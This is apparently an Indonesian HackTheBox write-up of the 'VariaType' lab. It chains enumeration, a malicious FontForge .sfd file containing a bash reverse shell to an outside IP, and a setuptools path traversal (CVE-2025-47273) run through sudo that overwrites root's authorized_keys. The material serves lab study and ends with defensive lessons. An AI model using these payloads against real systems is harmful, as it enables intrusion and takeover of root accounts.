# HackTheBox - VariaType Machine Writeup
![HTB](https://img.shields.io/badge/HackTheBox-Labs-green)![Machine](https://img.shields.io/badge/Machine-VariaType-blue)
![OS](https://img.shields.io/badge/OS-Linux-orange)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-yellow)

Mesin **VariaType** adalah lab Linux yang menampilkan kombinasi beberapa kerentanan yang jika dirangkai dapat menghasilkan akses **root penuh**. Proses eksploitasi dimulai dari enumerasi domain, analisis aplikasi web, eksploitasi sistem pemrosesan font menggunakan FontForge untuk mendapatkan reverse shell, hingga privilege escalation melalui misconfiguration sudo dan kerentanan **Setuptools Path Traversal (CVE-2025-47273)**.

---

# 🧠 Kerentanan yang Ditemukan

Beberapa kerentanan utama pada mesin ini:

- Subdomain exposure
- Information disclosure melalui repository publik
- Command execution melalui file font `.sfd`
- Insecure font processing menggunakan **FontForge**
- Misconfiguration **sudo privilege**
- Arbitrary file write melalui **Setuptools Path Traversal (CVE-2025-47273)**
- SSH key injection

---

# 🛠 Tools yang Digunakan

Tools yang digunakan selama eksploitasi:

- Nmap
- FFUF
- Gobuster
- Git
- Netcat
- Python HTTP Server
- SSH
- FontForge
- Custom Python server

---

# 🔗 Exploit Chain



Recon
→ Subdomain Enumeration
→ Web Enumeration
→ GitHub Repository Discovery
→ Font Upload Feature Discovery
→ Malicious Font (.sfd)
→ User Access  steve
→ Sudo Misconfiguration
→ Setuptools Path Traversal (CVE-2025-47273)
→ Overwrite /root/.ssh/authorized_keys
→ SSH Login as root


---

# 🔎 1. Reconnaissance

Langkah pertama adalah melakukan scanning terhadap target untuk mengetahui service yang berjalan.

```
$ nmap -sC -sV -oN nmap.txt 10.129.242.109
```

Hasil scanning menunjukkan bahwa target menjalankan service web yang menjadi entry point eksploitasi.

---
# 🌐 2. Subdomain Enumeration

Selanjutnya dilakukan enumerasi subdomain menggunakan wordlist.
```
ffuf -u http://variatype.htb -H "Host: FUZZ.variatype.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

Dari proses ini ditemukan beberapa endpoint tambahan yang mengarah pada fitur internal aplikasi.

---

# 📂 3. Directory Enumeration

Melakukan enumerasi direktori pada web server.
```
ffuf -u http://variatype.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

Endpoint penting yang ditemukan :
``

/tools

/tools/variable-font-generator
``

Fitur ini memungkinkan pengguna mengupload file font.

---

# 🔍 4. GitHub Enumeration

Pada halaman aplikasi ditemukan referensi repository publik.

Repository tersebut berisi source code yang membantu memahami cara aplikasi memproses file font.

Clone repository:

```
git clone https://github.com/variatype-labs/font-tools
```

Dari source code ditemukan script berikut:
`` /opt/font-tools/install_validator.py ``

Script ini digunakan untuk menginstall plugin validator font.

---

# 💣 5. Exploiting Font Processing

Aplikasi memproses file font menggunakan **FontForge**.

Save File `.sfd` dapat berisi command yang dijalankan ketika file diproses.

Contoh payload:

```
SplineFontDB: 3.0
FontName: Exploit
FullName: Exploit
FamilyName: Exploit
Weight: Regular
ExecCommand: /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.63/5555 0>&1'
EndSplineFont
```


Menjalankan listener:
```
 nc -lvnp 5555
 ```

Setelah file diproses oleh server, reverse shell diperoleh sebagai user **steve**.

---

# 👤 6. User Foothold

Setelah mendapatkan shell:

```
$ whoami
```
``
Output:steve
``

Mengambil user flag:

```
$ cat /home/steve/user.txt
```

---

# 🔍 7. Privilege Enumeration

Memeriksa hak akses sudo:

```
$ /usr/bin/python3 /opt/font-tools/install_validator.py *
```

---

# ⚠️ 8. Vulnerability Analysis

Script tersebut menggunakan library **setuptools** PackageIndex().download(plugin_url, PLUGIN_DIR).


Versi setuptools yang digunakan rentan terhadap : 
**CVE-2025-47273** 

Kerentanan ini memungkinkan **path traversal melalui URL encoded slash**.

---

# 🔑 9. Preparing SSH Payload

Pada mesin attacker dibuat SSH key (Kali-linux) .

```
$ ssh-keygen -t ed25519 -f rootkey -N
```

Public key disalin menjadi: ``authorized_keys`` **:**
```
$ cat rootkey.pub > authorized_keys
```

---

# 🌍 10. Custom HTTP Server

Membuat server Python untuk mengirim file `authorized_keys`.
Save file ini bernama **server.py**

```
from http.server import BaseHTTPRequestHandler, HTTPServer

payload = open("authorized_keys","rb").read()

class handler(BaseHTTPRequestHandler):
def do_GET(self):
    self.send_response(200)
    self.send_header("Content-type","text/plain")
    self.end_headers()
    self.wfile.write(payload)
HTTPServer(("0.0.0.0",8888), handler).serve_forever()
```
Jalankan server : 
``` 
$ python3 server.py
 ```

---

# 🚀 11. Exploiting Path Traversal

Dari shell **steve** jalankan:

```
$ sudo /usr/bin/python3 /opt/font-tools/install_validator.py "http://10.10.14.63:8888/%2Froot%2F.ssh%2Fauthorized_keys"
```


File akan ditulis ke : ``/root/.ssh/authorized_keys``

---

# 👑 12. Root Access

Login menggunakan SSH key:

```
$ ssh -i rootkey root@10.129.242.109
```

Jika berhasil: ``` $ root@variatype:~# ```


---

# 🏁 13. Root Flag
```
$root@variatype:~# cat /root/root.txt
```

---

# 📚 Lessons Learned

Beberapa pelajaran penting dari mesin ini:

- File upload harus divalidasi dengan ketat
- Library pihak ketiga harus selalu diperbarui
- Akses sudo harus dibatasi
- URL input harus disanitasi dengan benar

Kerentanan kecil yang digabungkan dapat menghasilkan kompromi sistem penuh.
---
# 🏆 Achievement

Lab **VariaType** telah berhasil diselesaikan sepenuhnya. Saya menjadi pemain ke-**#2005** yang berhasil menaklukkan mesin ini pada Season 10.

### 📊 Machine Statistics
| Statistics | Details |
| :--- | :--- |
| **Machine Name** | VariaType |
| **OS** | Linux 🐧 |
| **Difficulty** | Medium |
| **Points** | 30 Points |
| **Machine Rating** | ⭐ 3.8/5 |
| **Rank Solved** | #2005 |

### 🏁 Proof of Completion
* **User Flag:** ✅ Owned
* **Root Flag:** ✅ Owned
* **Achievement Link:** [View on HackTheBox](https://labs.hackthebox.com/achievement/machine/3260794/850)

---

# ✍️ Author

Write-up ini dibuat berdasarkan proses eksploitasi langsung pada mesin **VariaType** di platform HackTheBox.

**Fazar Maulana** *Cyber Security Enthusiast | Red Team Learner*



[![HTB Profile](https://img.shields.io/badge/HackTheBox-Profile-green?style=flat&logo=hackthebox)](https://app.hackthebox.com/users/3260794)
